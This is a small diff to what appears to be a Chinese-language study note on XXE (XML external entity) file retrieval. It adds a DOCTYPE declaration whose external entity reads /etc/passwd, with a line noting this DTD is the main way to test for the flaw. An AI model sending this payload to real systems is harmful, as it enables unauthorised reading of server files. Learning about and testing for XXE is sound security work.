@@ -27,3 +27,7 @@ tags:
 
 ![](assets/XXE外部实体检索文件/file-20260104224855022.png)
 
+```XML
+<!DOCTYPE root [<!ENTITY guc SYSTEM "file:///etc/passwd">]>
+```
+最主要还是使用上述DTD声明来测试漏洞
